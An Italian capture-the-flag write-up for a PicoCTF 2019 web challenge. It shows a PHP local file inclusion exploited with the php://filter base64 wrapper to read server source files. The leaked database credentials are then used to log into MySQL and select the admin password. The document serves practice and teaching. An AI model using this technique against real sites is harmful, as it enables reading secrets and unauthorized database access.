---
tags:
  - WebExploitation
  - PicoCTF2019
---


## Problema

Get the admin's password. https://2019shell1.picoctf.com/problem/62195/ or http://2019shell1.picoctf.com:62195

## Soluzione

Andando sul link ottengo un redirect a:
```
https://2019shell1.picoctf.com/problem/62195/index.php?file=login
```
Capisco quindi che ho uno script PHP e che potenzialmente vi sono dei file che possono essere richiesti.
Per esempio se chiedo 
```
https://2019shell1.picoctf.com/problem/62195/index.php?file=admin
```
il sito mi dice che non sono un admin, quindi qualcosa sta facendo.
Provo con `file=user` e il sito mi dice `Unable to locate user.php`.
Capisco quindi che ciò che metto dopo "file" è un file PHP.
Questo è un esempio di una vulnerabilità LFI (Local File Inclusion) in quanto il mio script appende ".php" alla fine di quello che scrivo e poi cerca tale file con il `require once`.
In questo caso per vedere il contenuto di qualsiasi file PHP remoto è la funzione
```
php://filter/convert.base64_encode/resource
```
questo forza il PHP ad effettuare una codifica base64 del file richiesto e fornirlo in uscita.
Per esempio se chiamo l'url:
```
https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/convert.base64-encode/resource=index
```
fornisce il base64 della pagina `index.php`.
Sostituendo index con admin ottengo il base64 della pagina `admin.php`.
Per esempio decodificando il base64 di `index.php` ottengo le righe vulnerabili:
```php
if(!include($file.'.php')){
	echo 'Unable to locate '.$file.'.php';
}
```
Come immaginavo viene appeso `.php` alla fine del file in un include.
Proviamo a decodificare `admin.php`:
```php
<?php
require_once('cookie.php');
if(isset($perm) && $perm->is_admin()){
?>
```
vedo che chiama `cookie.php` che probabilmente gli permetterà di capire se sono admin o meno.
Decodifichiamo anche `cookie.php` e otteniamo un mega PHP con varie tipologie di autenticazioni, il punto è sempre il `require_once` in alto
Mi accorgo di:
```php
require_once('../sql_connect.php');
```
Vado a decodificare anche quello e ottengo:
```php
$sql_server = 'localhost';
$sql_user = 'mysql';
$sql_pass = 'this1sAR@nd0mP@s5w0rD#%';
$sql_conn = new mysqli($sql_server, $sql_user, $sql_pass);
$sql_conn_login = new mysqli($sql_server, $sql_user, $sql_pass);
```
Ora mi devo quindi connettere al dbms mysql del server, utilizzo la Shell fornita dal sito PicoCTF. Una volta inserite le mie credenziali mi connetto a mysql con il comando
```bash
mysql -u mysql -p
```
Posso fare questo in quando vedo che il server è in locale, quindi direttamente nella shell di PicoCTF.
Inserisco la password letta sopra e entro in MySql.
Una volta fatto questo lancio una query di SELECT sul db degli utenti (so che si chiama `pico_ch2.users` in quanto l'ho visto nelle query di `admin.php`.
```sql
SELECT * FROM pico_ch2.users;
```
e ottengo la password dell'utente amministratore:
```
picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7}
```
che è la flag che mi serve.


